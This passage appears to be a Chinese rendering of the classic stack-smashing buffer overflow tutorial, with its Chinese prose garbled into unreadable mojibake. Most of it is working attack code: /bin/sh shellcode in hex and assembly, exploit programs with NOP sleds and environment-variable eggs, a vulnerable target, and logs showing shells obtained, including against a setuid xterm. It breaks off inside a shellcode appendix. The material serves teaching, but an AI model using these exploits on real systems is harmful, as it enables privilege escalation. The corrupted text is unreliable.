\"\\xb8\\x01\\x00\\x00\\x00\\xbb\\x00\\x00\\x00\\x00\\xcd\\x80\\xe8\\xd1\\xff\\xff\" \"\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x89\\xec\\x5d\\xc3\"; void main() { int *ret; ret = (int *)\u0026ret + 2; (*ret) = (int)shellcode; }   ç¼–è¯‘å¹¶è¿è¡Œï¼š\n1 2 3 4  [aleph1]$ gcc -o testsc testsc.c [aleph1]$ ./testsc $ exit [aleph1]$   ohhhhhhè¿™æˆåŠŸäº†ï¼ä½†æ˜¯æœ‰ä¸€ä¸ªéšœç¢ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šè¯•å›¾æº¢å‡ºå­—ç¬¦ç¼“å†²åŒºã€‚å› æ­¤ï¼Œshellcodeä¸­çš„ä»»ä½•ç©ºå­—èŠ‚éƒ½å°†è¢«è§†ä¸ºå­—ç¬¦ä¸²çš„ç»“å°¾ï¼Œå¤åˆ¶æ“ä½œå°†è¢«ç»ˆæ­¢ã€‚shellcodeä¸­ä¸èƒ½æœ‰ç©ºå­—èŠ‚ï¼Œexpæ‰èƒ½å·¥ä½œã€‚è®©æˆ‘ä»¬å°è¯•æ¶ˆé™¤ç©ºå­—èŠ‚ï¼ˆåŒæ—¶ä½¿shellcodeå˜å°ï¼‰\næˆ‘ä»¬æ”¹è¿›çš„ä»£ç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  //shellcodeasm2.c void main() { __asm__(\"  jmp\t0x1f # 2 bytes\tpopl %esi\t# 1 bytes movl %esi,0x8(%esi) # 3 bytes xorl %eax,%eax\t# 2 bytes movb %eax,0x7(%esi) # 3 bytes movl %eax,0xc(%esi) # 3 bytes movb $0xb,%al # 2 bytes movl %esi,%ebx\t# 2 bytes leal 0x8(%esi),%ecx # 3 bytes leal 0xc(%esi),%edx\t# 3 bytes int\t$0x80\t# 2 bytes xorl %ebx,%ebx # 2 bytes movl %ebx,%eax\t# 2 bytes inc\t%eax\t# 1 bytes int\t$0x80 # 2 bytes call -0x24 # 5 bytes .string \\\"/bin/sh\\\"# 8 bytes # 46 bytes total  \");  }   ç„¶åæ–°çš„æµ‹è¯•ç¨‹åºå¦‚ä¸‹\n1 2 3 4 5 6 7  //testsc2.c char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; void main() { int *ret; ret = (int *)\u0026ret + 2; (*ret) = (int)shellcode; }   1 2 3 4  [aleph1]$ gcc -o testsc2 testsc2.c [aleph1]$ ./testsc2 $ exit [aleph1]$   Writing an Exploit è®©æˆ‘ä»¬è¯•ç€æŠŠä¹‹å‰çš„æ‰€æœ‰çš„ä¸œè¥¿éƒ½æ‹¼åœ¨ä¸€èµ·ã€‚æˆ‘ä»¬æœ‰shellcodeã€‚æˆ‘ä»¬çŸ¥é“å®ƒä¸€å®šæ˜¯æˆ‘ä»¬ç”¨æ¥æº¢å‡ºç¼“å†²åŒºçš„å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚æˆ‘ä»¬çŸ¥é“å¿…é¡»å°†è¿”å›åœ°å€æŒ‡å‘ç¼“å†²åŒºã€‚æ­¤ç¤ºä¾‹å°†æ¼”ç¤ºä¸Šé¢è¯´çš„å‡ ç‚¹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  //overflow1.c char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; char large_string[128]; void main(){ char buffer[96]; int i; long *long_ptr = (long *) large_string; for (i = 0; i \u003c 32; i++) *(long_ptr + i) = (int) buffer; for (i = 0; i \u003c strlen(shellcode); i++) large_string[i] = shellcode[i]; strcpy(buffer,large_string); } /* [aleph1]$ gcc -o exploit1 exploit1.c [aleph1]$ ./exploit1 $ exit exit [aleph1]$ */   æˆ‘ä»¬åœ¨ä¸Šé¢æ‰€åšçš„æ˜¯ç”¨æ•°ç»„large_string[]çš„åœ°å€å»å¡«å……buffer[]ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬çš„ä»£ç æ‰€åœ¨çš„ä½ç½®ã€‚ç„¶åæˆ‘ä»¬å°†shellcodeå¤åˆ¶åˆ°large_string[]ä¸­ã€‚strcpy()å°†æŠŠlarge_string[]å¤åˆ¶åˆ°buffer[]ä¸­ï¼Œè€Œä¸åšä»»ä½•è¾¹ç•Œæ£€æŸ¥ï¼Œå¹¶ä¸”å°†ä½¿è¿”å›åœ°å€æº¢å‡ºï¼Œç”¨ä»£ç ç°åœ¨æ‰€åœ¨çš„åœ°å€è¦†ç›–å®ƒã€‚ä¸€æ—¦æˆ‘ä»¬åˆ°è¾¾mainçš„æœ«å°¾ï¼Œå®ƒè¯•å›¾è¿”å›ï¼Œå®ƒå°±ä¼šè·³è½¬åˆ°æˆ‘ä»¬çš„ä»£ç ï¼Œå¹¶æ‰§è¡Œä¸€ä¸ªshellã€‚å½“æˆ‘ä»¬è¯•å›¾ä½¿å¦ä¸€ä¸ªç¨‹åºçš„ç¼“å†²åŒºæº¢å‡ºæ—¶ï¼Œæˆ‘ä»¬é¢ä¸´çš„é—®é¢˜æ˜¯è¯•å›¾æ‰¾å‡ºç¼“å†²åŒºï¼ˆä»¥åŠæˆ‘ä»¬çš„ä»£ç ï¼‰çš„åœ°å€ã€‚è¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆæ˜¯ï¼Œå¯¹äºæ¯ä¸ªç¨‹åºï¼Œå †æ ˆéƒ½å°†ä»ç›¸åŒçš„åœ°å€å¼€å§‹ã€‚å¤§å¤šæ•°ç¨‹åºåœ¨ä»»ä½•æ—¶å€™éƒ½ä¸ä¼šå°†è¶…è¿‡å‡ ç™¾æˆ–å‡ åƒå­—èŠ‚çš„æ•°æ®æ¨å…¥å †æ ˆã€‚å› æ­¤ï¼Œé€šè¿‡çŸ¥é“å †æ ˆä»ä½•å¤„å¼€å§‹ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•çŒœæµ‹è¦æº¢å‡ºçš„ç¼“å†²åŒºå°†åœ¨ä½•å¤„ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªå°ç¨‹åºï¼Œå®ƒå°†æ‰“å°å †æ ˆæŒ‡é’ˆï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13  //sp.c unsigned long get_sp(void) { __asm__(\"movl %esp,%eax\"); } void main() { printf(\"0x%x\\n\", get_sp()); } /* [aleph1]$ ./sp 0x8000470 [aleph1]$ */   è®©æˆ‘ä»¬å‡è®¾ä¸‹é¢è¿™ä¸ªæ˜¯æˆ‘ä»¬è¦æº¢å‡ºçš„ç¨‹åº\n1 2 3 4 5 6  //vulnerable.c void main(int argc, char *argv[]) { char buffer[512]; if(argc \u003e 1) strcpy(buffer, argv[1]); }   æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªç¨‹åºï¼Œå°†ç¼“å†²åŒºå¤§å°å’Œå®ƒè‡ªèº«å †æ ˆæŒ‡é’ˆçš„åç§»é‡ï¼ˆæˆ‘ä»¬è®¤ä¸ºè¦æº¢å‡ºçš„ç¼“å†²åŒºå¯èƒ½å­˜åœ¨çš„ä½ç½®ï¼‰ä½œä¸ºå‚æ•°ã€‚æˆ‘ä»¬å°†æŠŠæº¢å‡ºå­—ç¬¦ä¸²æ”¾åœ¨ä¸€ä¸ªç¯å¢ƒå˜é‡ä¸­ï¼Œè¿™æ ·æ›´å®¹æ˜“æ“ä½œ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  //exploit2.c #include \u003cstdlib.h\u003e  #define DEFAULT_OFFSET\t0 #define DEFAULT_BUFFER_SIZE\t512  char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; unsigned long get_sp(void) { __asm__(\"movl %esp,%eax\"); } void main(int argc, char *argv[]) { char *buff, *ptr; long *addr_ptr, addr; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; int i; if (argc \u003e 1) bsize = atoi(argv[1]); if (argc \u003e 2) offset = atoi(argv[2]); if (!(buff = malloc(bsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } addr = get_sp() - offset; printf(\"Using address: 0x%x\\n\", addr); ptr = buff; addr_ptr = (long *) ptr; for (i = 0; i \u003c bsize; i+=4) *(addr_ptr++) = addr; ptr += 4; for (i = 0; i \u003c strlen(shellcode); i++) *(ptr++) = shellcode[i]; buff[bsize - 1] = '\\0'; memcpy(buff,\"EGG=\",4); putenv(buff); system(\"/bin/bash\"); }   ç°åœ¨æˆ‘ä»¬å¯ä»¥å°è¯•å»çŒœbufferå’Œåç§»é‡æ˜¯ä»€ä¹ˆäº†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  [aleph1]$ ./exploit2 500 Using address: 0xbffffdb4 [aleph1]$ ./vulnerable $EGG [aleph1]$ exit [aleph1]$ ./exploit2 600 Using address: 0xbffffdb4 [aleph1]$ ./vulnerable $EGG Illegal instruction [aleph1]$ exit [aleph1]$ ./exploit2 600 100 Using address: 0xbffffd4c [aleph1]$ ./vulnerable $EGG Segmentation fault [aleph1]$ exit [aleph1]$ ./exploit2 600 200 Using address: 0xbffffce8 [aleph1]$ ./vulnerable $EGG Segmentation fault [aleph1]$ exit . . . [aleph1]$ ./exploit2 600 1564 Using address: 0xbffff794 [aleph1]$ ./vulnerable $EGG $   æ­£å¦‚æˆ‘ä»¬æ‰€çœ‹åˆ°çš„ï¼Œè¿™ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆç‡çš„è¿‡ç¨‹ã€‚å³ä½¿æˆ‘ä»¬çŸ¥é“å †æ ˆçš„èµ·å§‹ä½ç½®ï¼Œä¹Ÿå‡ ä¹ä¸å¯èƒ½çŒœæµ‹åç§»é‡ã€‚æˆ‘ä»¬æœ€å¤šéœ€è¦ä¸€ç™¾æ¬¡ï¼Œæœ€åä¹Ÿéœ€è¦å‡ åƒæ¬¡ã€‚é—®é¢˜æ˜¯æˆ‘ä»¬éœ€è¦ç²¾ç¡®åœ°çŒœæµ‹ä»£ç çš„åœ°å€å°†ä»å“ªé‡Œå¼€å§‹ã€‚å¦‚æœæˆ‘ä»¬å¤šçŒœä¸€ä¸ªå­—èŠ‚æˆ–å°‘çŒœä¸€ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬åªä¼šå¾—åˆ°ä¸€ä¸ªæ®µé”™è¯¯(segmentation violation)æˆ–ä¸€ä¸ªéæ³•æŒ‡ä»¤(invalid instruction)ã€‚å¢åŠ æœºä¼šçš„ä¸€ç§æ–¹æ³•æ˜¯ç”¨NOPæŒ‡ä»¤å¡«å……æº¢å‡ºç¼“å†²åŒºçš„å‰ç«¯ã€‚å‡ ä¹æ‰€æœ‰å¤„ç†å™¨éƒ½æœ‰æ‰§è¡Œç©ºæ“ä½œçš„NOPæŒ‡ä»¤ã€‚å®ƒé€šå¸¸ç”¨äºå»¶è¿Ÿæ‰§è¡Œæ—¶é—´ã€‚æˆ‘ä»¬å°†åˆ©ç”¨å®ƒå¹¶ç”¨å®ƒä»¬å¡«å……æº¢å‡ºç¼“å†²åŒºçš„ä¸€åŠã€‚æˆ‘ä»¬å°†æŠŠæˆ‘ä»¬çš„shellcodeæ”¾åœ¨ä¸­å¿ƒï¼Œç„¶ååœ¨å¥¹åé¢æ”¾ä¸Šè¿”å›åœ°å€ã€‚å¦‚æœå¹¸è¿çš„è¯ï¼Œè¿”å›åœ°å€æŒ‡å‘nopå­—ç¬¦ä¸²ä¸­çš„ä»»ä½•ä¸€ä¸ªåœ°æ–¹ï¼Œå®ƒä»¬å°±ä¼šè¢«æ‰§è¡Œï¼Œç›´åˆ°åˆ°è¾¾æˆ‘ä»¬çš„ä»£ç ä¸ºæ­¢ã€‚åœ¨è‹±ç‰¹å°”ä½“ç³»ç»“æ„ä¸­ï¼ŒNOPæŒ‡ä»¤çš„é•¿åº¦ä¸ºä¸€ä¸ªå­—èŠ‚ï¼Œåœ¨æœºå™¨ä»£ç ä¸­è½¬æ¢ä¸º0x90ã€‚å‡è®¾å †æ ˆä»åœ°å€0xFFå¼€å§‹ï¼ŒSä»£è¡¨shellä»£ç ï¼ŒNä»£è¡¨NOPæŒ‡ä»¤ï¼Œæ–°å †æ ˆå°†å¦‚ä¸‹æ‰€ç¤ºï¼š\næ–°çš„expå¦‚ä¸‹exploit3.cæ‰€ç¤º\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  //exploit3.c #include \u003cstdlib.h\u003e #define DEFAULT_OFFSET\t0 #define DEFAULT_BUFFER_SIZE\t512 #define NOP\t0x90  char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; unsigned long get_sp(void) { __asm__(\"movl %esp,%eax\"); } void main(int argc, char *argv[]) { char *buff, *ptr; long *addr_ptr, addr; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; int i; if (argc \u003e 1) bsize = atoi(argv[1]); if (argc \u003e 2) offset = atoi(argv[2]); if (!(buff = malloc(bsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } addr = get_sp() - offset; printf(\"Using address: 0x%x\\n\", addr); ptr = buff; addr_ptr = (long *) ptr; for (i = 0; i \u003c bsize; i+=4) *(addr_ptr++) = addr; for (i = 0; i \u003c bsize/2; i++) buff[i] = NOP; ptr = buff + ((bsize/2) - (strlen(shellcode)/2)); for (i = 0; i \u003c strlen(shellcode); i++) *(ptr++) = shellcode[i]; buff[bsize - 1] = '\\0'; memcpy(buff,\"EGG=\",4); putenv(buff); system(\"/bin/bash\"); }   ç¼“å†²åŒºå¤§å°çš„ä¸€ä¸ªå¥½é€‰æ‹©æ˜¯æ¯”æˆ‘ä»¬è¯•å›¾æº¢å‡ºçš„ç¼“å†²åŒºå¤§å°å¤šå¤§çº¦100å­—èŠ‚ã€‚è¿™å°†æŠŠæˆ‘ä»¬çš„ä»£ç æ”¾åœ¨æˆ‘ä»¬è¯•å›¾æº¢å‡ºçš„ç¼“å†²åŒºçš„æœ«å°¾ï¼Œä¸ºnopæä¾›å¤§é‡çš„ç©ºé—´ï¼Œä½†æ˜¯ä»ç„¶ç”¨æˆ‘ä»¬çŒœæµ‹çš„åœ°å€è¦†ç›–è¿”å›åœ°å€ã€‚æˆ‘ä»¬è¯•å›¾æº¢å‡ºçš„ç¼“å†²åŒºæ˜¯512å­—èŠ‚é•¿ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†ä½¿ç”¨612ã€‚è®©æˆ‘ä»¬å°è¯•ç”¨æ–°çš„æ¼æ´æº¢å‡ºæµ‹è¯•ç¨‹åºï¼š\n1 2 3 4  [aleph1]$ ./exploit3 612 Using address: 0xbffffdb4 [aleph1]$ ./vulnerable $EGG $   å“‡ï¼ç¬¬ä¸€æ¬¡å°è¯•å°±æˆåŠŸäº†ï¼è¿™ä¸€å˜åŒ–ä½¿æˆ‘ä»¬çš„æœºä¼šå¢åŠ äº†ä¸€ç™¾å€ã€‚ç°åœ¨è®©æˆ‘ä»¬åœ¨ä¸€ä¸ªç¼“å†²åŒºæº¢å‡ºçš„çœŸå®æ¡ˆä¾‹ä¸­å°è¯•ä¸€ä¸‹ã€‚æˆ‘ä»¬å°†ä½¿ç”¨Xtåº“ä¸Šçš„ç¼“å†²åŒºæº¢å‡ºè¿›è¡Œæ¼”ç¤ºã€‚å¯¹äºæˆ‘ä»¬çš„ç¤ºä¾‹ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨xtermï¼ˆæ‰€æœ‰ä¸Xtåº“é“¾æ¥çš„ç¨‹åºéƒ½æ˜¯æ˜“å—æ”»å‡»çš„ï¼‰ã€‚æ‚¨å¿…é¡»è¿è¡ŒXæœåŠ¡å™¨å¹¶å…è®¸ä»æœ¬åœ°ä¸»æœºè¿æ¥åˆ°å®ƒï¼Œè¯·æ®æ­¤è®¾ç½®æ˜¾ç¤ºå˜é‡ã€‚\n xterm æ˜¯ä¸€ä¸ª X Window Systemä¸Šçš„ç»ˆç«¯æ¨¡æ‹Ÿå™¨ï¼Œç±»ä¼¼ç°åœ¨çš„XShell\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  [aleph1]$ export DISPLAY=:0.0 [aleph1]$ ./exploit3 1124 Using address: 0xbffffdb4 [aleph1]$ /usr/X11R6/bin/xterm -fg $EGG ^C [aleph1]$ exit [aleph1]$ ./exploit3 2148 100 Using address: 0xbffffd48 [aleph1]$ /usr/X11R6/bin/xterm -fg $EGG .... Warning: some arguments in previous message were lost Illegal instruction [aleph1]$ exit . . . [aleph1]$ ./exploit4 2148 600 Using address: 0xbffffb54 [aleph1]$ /usr/X11R6/bin/xterm -fg $EGG Warning: some arguments in previous message were lost bash$   Eurekaï¼ä¸åˆ°åå‡ æ¬¡å°è¯•ï¼Œæˆ‘ä»¬å‘ç°äº†è¿™ä¸ªç¥å¥‡çš„æ•°å­—ã€‚å¦‚æœxtermæ˜¯ä»¥suid rootå®‰è£…çš„ï¼Œé‚£ä¹ˆå®ƒç°åœ¨å°±æ˜¯ä¸€ä¸ªæœ‰rootæƒé™çš„shelläº†ï¼\nSmall Buffer Overflows æœ‰æ—¶ï¼Œä½ è¯•å›¾æº¢å‡ºçš„ç¼“å†²åŒºå¤ªå°ï¼Œä»¥è‡³äºshellcodeæ— æ³•æ”¾å…¥å…¶ä¸­ï¼Œå®ƒå°†ç”¨æŒ‡ä»¤è€Œä¸æ˜¯ä»£ç çš„åœ°å€è¦†ç›–è¿”å›åœ°å€ï¼Œæˆ–è€…æ‚¨å¯ä»¥å¡«å……å­—ç¬¦ä¸²å‰é¢çš„nopå¤ªå°‘ï¼ŒçŒœæµ‹å…¶åœ°å€çš„æœºä¼šå¾®ä¹å…¶å¾®ã€‚ä¸ºäº†ä»è¿™äº›ç¨‹åºä¸­è·å¾—ä¸€ä¸ªshellï¼Œæˆ‘ä»¬å¿…é¡»ç”¨å¦ä¸€ç§æ–¹æ³•ã€‚åªæœ‰å½“æ‚¨å¯ä»¥è®¿é—®ç¨‹åºçš„ç¯å¢ƒå˜é‡æ—¶ï¼Œè¿™ç§ç‰¹æ®Šçš„æ–¹æ³•æ‰æœ‰æ•ˆã€‚æˆ‘ä»¬è¦åšçš„æ˜¯å°†shellcodeæ”¾åœ¨ä¸€ä¸ªç¯å¢ƒå˜é‡ä¸­ï¼Œç„¶åç”¨å†…å­˜ä¸­è¿™ä¸ªå˜é‡çš„åœ°å€æº¢å‡ºç¼“å†²åŒºã€‚æ­¤æ–¹æ³•è¿˜å¢åŠ äº†å¯¹æ¼æ´åˆ©ç”¨çš„æ›´æ”¹ï¼Œå› ä¸ºæ‚¨å¯ä»¥ä½¿å®¹çº³shellä»£ç çš„ç¯å¢ƒå˜é‡å°½å¯èƒ½å¤§ã€‚å½“ç¨‹åºå¯åŠ¨æ—¶ï¼Œç¯å¢ƒå˜é‡å­˜å‚¨åœ¨å †æ ˆçš„é¡¶éƒ¨ï¼Œsetenvï¼ˆï¼‰æ‰€åšçš„ä»»ä½•ä¿®æ”¹éƒ½ä¼šåˆ†é…åˆ°å…¶ä»–åœ°æ–¹ã€‚å¼€å§‹æ—¶çš„å †æ ˆå¦‚ä¸‹æ‰€ç¤ºï¼š\n\u003cstrings\u003e\u003cargv pointers\u003eNULL\u003cenvp pointers\u003eNULL\u003cargc\u003e\u003cargv\u003eenvp\u003e æˆ‘ä»¬æ–°ç¨‹åºä¼šå¸¦æ¥ä¸€ä¸ªé¢å¤–çš„å˜é‡ï¼Œå³åŒ…å«shellcodeå’Œnopçš„å˜é‡çš„å¤§å°ã€‚æˆ‘ä»¬çš„æ–°æ¼æ´ç°åœ¨çœ‹èµ·æ¥åƒè¿™æ ·ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57  //exploit4.c #include \u003cstdlib.h\u003e  #define DEFAULT_OFFSET\t0 #define DEFAULT_BUFFER_SIZE\t512 #define DEFAULT_EGG_SIZE\t2048 #define NOP\t0x90  char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; unsigned long get_esp(void){ __asm__(\"movl %esp,%eax\"); } void main(int argc, char *argv[]){ char *buff, *ptr, *egg; long *addr_ptr, addr; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; int i, eggsize=DEFAULT_EGG_SIZE; if (argc \u003e 1) bsize = atoi(argv[1]); if (argc \u003e 2) offset = atoi(argv[2]); if (argc \u003e 3) eggsize = atoi(argv[3]); if (!(buff = malloc(bsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } if (!(egg = malloc(eggsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } addr = get_esp() - offset; printf(\"Using address: 0x%x\\n\", addr); ptr = buff; addr_ptr = (long *) ptr; for (i = 0; i \u003c bsize; i+=4) *(addr_ptr++) = addr; ptr = egg; for (i = 0; i \u003c eggsize - strlen(shellcode) - 1; i++) *(ptr++) = NOP; for (i = 0; i \u003c strlen(shellcode); i++) *(ptr++) = shellcode[i]; buff[bsize - 1] = '\\0'; egg[eggsize - 1] = '\\0'; memcpy(egg,\"EGG=\",4); putenv(egg); memcpy(buff,\"RET=\",4); putenv(buff); system(\"/bin/bash\"); }   è®©æˆ‘ä»¬å°è¯•æˆ‘ä»¬æ–°çš„expæ€ä¹ˆæ ·\n1 2 3 4  [aleph1]$ ./exploit4 768 Using address: 0xbffffdb0 [aleph1]$ ./vulnerable $RET $   è¿™è¿è¡Œèµ·æ¥éå¸¸æœ‰é­…åŠ›ï¼Œè®©æˆ‘åœ¨xtermä¸Šè¯•è¯•\n1 2 3 4 5 6 7 8  [aleph1]$ export DISPLAY=:0.0 [aleph1]$ ./exploit4 2148 Using address: 0xbffffdb0 [aleph1]$ /usr/X11R6/bin/xterm -fg $RET Warning: Color name ...Â°Â¤Ã¿Â¿Â°Â¤Ã¿Â¿Â°Â¤ ... Warning: some arguments in previous message were lost $   ç¬¬ä¸€æ¬¡å°è¯•å°±æˆåŠŸäº†ï¼è¿™æ— ç–‘å¢åŠ äº†æˆ‘ä»¬çš„æœºä¼šã€‚æ ¹æ®æ¼æ´åˆ©ç”¨ç¨‹åºä¸è¦å°è¯•åˆ©ç”¨çš„ç¨‹åºæ¯”è¾ƒçš„ç¯å¢ƒæ•°æ®é‡ï¼ŒçŒœæµ‹çš„åœ°å€å¯èƒ½å¤ªä½æˆ–å¤ªé«˜ã€‚æˆ‘ä»¬éœ€è¦ç”¨æ­£è´Ÿåç§»é‡è¿›è¡Œå®éªŒã€‚\nFinding Buffer Overflows å¦‚ä¸Šæ‰€è¿°ï¼Œç¼“å†²åŒºæº¢å‡ºæ˜¯ç”±äºå°†æ›´å¤šçš„ä¿¡æ¯å¡«å……åˆ°ç¼“å†²åŒºä¸­è€Œæ— æ³•å®¹çº³çš„ç»“æœã€‚ç”±äºCæ²¡æœ‰ä»»ä½•å†…ç½®çš„è¾¹ç•Œæ£€æŸ¥ï¼Œæ‰€ä»¥æº¢å‡ºé€šå¸¸è¡¨ç°ä¸ºåœ¨å­—ç¬¦æ•°ç»„æœ«å°¾å†™å…¥ã€‚Cçš„æ ‡å‡†åº“æä¾›äº†è®¸å¤šç”¨äºå¤åˆ¶æˆ–æ‹¼æ¥å­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œè¿™äº›å‡½æ•°éƒ½ä¸æ‰§è¡Œè¾¹ç•Œæ£€æŸ¥ã€‚å®ƒä»¬åŒ…æ‹¬ï¼šstrcat()ï¼Œstrcpy()ï¼Œsprintf()å’Œvsprintf()ã€‚è¿™äº›å‡½æ•°å¯¹ä»¥\\0ç»“å°¾çš„å­—ç¬¦ä¸²èµ·ä½œç”¨ï¼Œå¹¶ä¸”ä¸æ£€æŸ¥æ¥æ”¶å­—ç¬¦ä¸²æ˜¯å¦æº¢å‡ºã€‚gets()æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå°†ä»stdinçš„ä¸€è¡Œè¯»å–åˆ°ç¼“å†²åŒºä¸­ï¼Œç›´åˆ°ç»ˆæ­¢æ¢è¡Œç¬¦æˆ–EOFã€‚å®ƒä¸æ£€æŸ¥ç¼“å†²åŒºæº¢å‡ºã€‚å¦‚æœæ‚¨è¦åŒ¹é…ä¸€ç³»åˆ—éç©ºæ ¼å­—ç¬¦ï¼ˆï¼…sï¼‰ï¼Œåˆ™scanf()ç³»åˆ—å‡½æ•°ä¹Ÿå¯èƒ½ä¼šå‡ºç°é—®é¢˜ï¼Œæˆ–åŒ¹é…æŒ‡å®šé›†åˆï¼ˆï¼…[]ï¼‰ä¸­çš„éç©ºå­—ç¬¦åºåˆ—ï¼Œä»¥åŠcharæŒ‡é’ˆæŒ‡å‘çš„æ•°ç»„ä¸è¶³ä»¥å®¹çº³æ•´ä¸ªå­—ç¬¦åºåˆ—ï¼Œå¹¶ä¸”å°šæœªå®šä¹‰å¯é€‰çš„æœ€å¤§å­—æ®µå®½åº¦ã€‚å¦‚æœè¿™äº›å‡½æ•°ä¸­çš„ä»»ä½•ä¸€ä¸ªçš„ç›®æ ‡éƒ½æ˜¯é™æ€å¤§å°çš„ç¼“å†²åŒºï¼Œå¹¶ä¸”å…¶å¦ä¸€ä¸ªå‚æ•°æ˜¯é€šè¿‡æŸç§æ–¹å¼ä»ç”¨æˆ·è¾“å…¥æ´¾ç”Ÿçš„ï¼Œåˆ™å¾ˆå¯èƒ½åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºæ¥æ”»å‡»ã€‚æˆ‘ä»¬å‘ç°çš„å¦ä¸€ç§å¸¸è§çš„ç¼–ç¨‹æ„é€ æ˜¯ä½¿ç”¨ whileå¾ªç¯ï¼Œä¸€æ¬¡å°†ä¸€ä¸ªå­—ç¬¦ä»stdinæˆ–æŸä¸ªæ–‡ä»¶è¯»å…¥ç¼“å†²åŒºï¼Œç›´åˆ°åˆ°è¾¾è¡Œå°¾ï¼Œæ–‡ä»¶æœ«å°¾æˆ–å…¶ä»–å®šç•Œç¬¦ã€‚è¿™ç§ç±»å‹çš„æ„é€ é€šå¸¸ä½¿ç”¨ä»¥ä¸‹å‡½æ•°ä¹‹ä¸€ï¼šgetc()ï¼Œfgetc()æˆ–getchar()ã€‚å¦‚æœåœ¨whileå¾ªç¯ä¸­æ²¡æœ‰æ˜¾å¼æ£€æŸ¥æ˜¯å¦æœ‰æº¢å‡ºï¼Œåˆ™å¾ˆå®¹æ˜“åˆ©ç”¨è¿™äº›ç¨‹åºã€‚æœ€ åï¼Œgrepï¼ˆ1ï¼‰æ˜¯ä½ çš„æœ‹å‹ã€‚å¼€æºæ“ä½œç³»ç»ŸåŠå…¶å¼€æºç¨‹åºçš„æºç å¾ˆå®¹æ˜“è·å¾—ã€‚ä¸€æ—¦æ‚¨æ„è¯†åˆ°è®¸å¤šå•†ä¸šæ“ä½œç³»ç»Ÿå·¥å…·ä¸å¼€æºç¨‹åºæœ‰ç›¸åŒçš„æºç ï¼Œè¿™ä¸€åˆ‡å°±å˜å¾—éå¸¸æœ‰è¶£ã€‚Use the source d00dã€‚\n é™„å½•Aï¼šShellcode for Different Operating Systems/Architectures i386/Linux (32bi)\njmp\t0x1f popl %esi movl %esi,0x8(%esi) xorl %eax,%eax movb %eax,0x7(%esi) movl %eax,0xc(%esi) movb $0xb,%al movl %esi,%ebx l eal 0x8(%esi),%ecx leal 0xc(%esi),%edx int\t$0x80 xorl %ebx,%ebx movl %ebx,%eax inc\t%eax int\t$0x80 call -0x24 .string \\\"/bin/sh\\\" SPARC/Solaris\nsethi 0xbd89a, %l6 or\t%l6, 0x16e, %l6 sethi 0xbdcda, 